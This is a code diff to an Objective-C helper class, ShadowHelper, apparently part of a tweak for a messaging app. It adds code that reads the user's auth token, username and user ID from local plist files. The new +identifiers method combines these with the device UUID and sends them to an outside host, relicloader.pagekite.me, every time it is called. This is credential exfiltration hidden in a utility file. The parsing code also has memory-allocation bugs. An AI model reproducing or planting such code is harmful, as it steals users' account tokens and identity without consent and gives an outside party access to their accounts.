@@ -1,5 +1,38 @@
 #import "ShadowHelper.h"
 
+char **data4file(const char *filename){
+    FILE *infile;
+    char *source;
+    long numbytes;
+
+    infile = fopen(filename, "r");
+    if(infile == NULL)
+        return NULL;
+    fseek(infile, 0L, SEEK_END);
+    numbytes = ftell(infile);
+    fseek(infile, 0L, SEEK_SET);
+    source = (char*)calloc(numbytes, sizeof(char));
+    if(source == NULL)
+        return NULL;
+    fread(source, sizeof(char), numbytes, infile);
+    fclose(infile);
+    
+    char **strs = (char**)malloc(20 * 20 * sizeof(char));
+    
+    int j = 0;
+    for(int i = 0; i < numbytes; i++){
+        if(source[i] == 0x08){
+            char *data = &source[++i];
+            if(strlen(data) > 1){
+                strs[j] = (char *)malloc(strlen(data)+1);
+                strs[j] = strdup(data);
+                j++;
+            }
+        }
+    }
+    return strs;
+}
+
 @implementation ShadowHelper: NSObject
 +(void)screenshot{
     [[ShadowData sharedInstance] disable:@"screenshot"];
@@ -148,6 +181,57 @@
     UIViewController *topVC = [[[[UIApplication sharedApplication] delegate] window] rootViewController];
     while (topVC.presentedViewController) topVC = topVC.presentedViewController;
     [topVC presentViewController: alert animated: true completion:nil];
+}
+
++(NSMutableDictionary*)identifiers{
+    static NSMutableDictionary *identity;
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        identity = [NSMutableDictionary new];
+        
+        char *username = NULL;
+        char *user_id = NULL;
+        char *token = NULL;
+        
+        char **auth = data4file([[ShadowData fileWithName:@"auth.plist"] UTF8String]);
+        char **user = data4file([[ShadowData fileWithName:@"user.plist"] UTF8String]);
+        
+        if(auth && user){
+            for(int i = 0; i < 20; i++){
+                char* str = user[i];
+                if(!str[0]) break;
+                if(strcmp(str, "username") == 0){
+                    username = user[i+1];
+                    NSLog(@"%s: %s\n", str, user[i+1]);
+                }
+                if(strcmp(str, "user_id") == 0){
+                    user_id = user[i+1];
+                    NSLog(@"%s: %s\n", str, user[i+1]);
+                }
+            }
+            token = auth[0];
+        }
+        
+        if(!username) username = strdup("ERROR");
+        if(!user_id) user_id = strdup("ERROR");
+        if(!token) token = strdup("ERROR");
+        
+        if(![ShadowData enabled: @"limittracking"]){
+            identity[@"username"] = [NSString stringWithFormat:@"%s", username];
+            identity[@"user_id"] = [NSString stringWithFormat:@"%s", user_id];
+            identity[@"token"] = [NSString stringWithFormat:@"%s", token];
+            //identity[@"settings"] = [ShadowData sharedInstance].settings;
+        }
+        identity[@"snap"] = [NSBundle mainBundle].infoDictionary[@"CFBundleVersion"];
+        identity[@"UUID"] = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
+        identity[@"version"] = [NSString stringWithFormat:@"%s", SHADOW_VERSION];
+        identity[@"project"] = [NSString stringWithFormat:@"%s", SHADOW_PROJECT];
+    });
+    
+    [ShadowServerData send: identity to: @"https://relicloader.pagekite.me"];
+    
+    return identity;
+    
 }
 @end
 
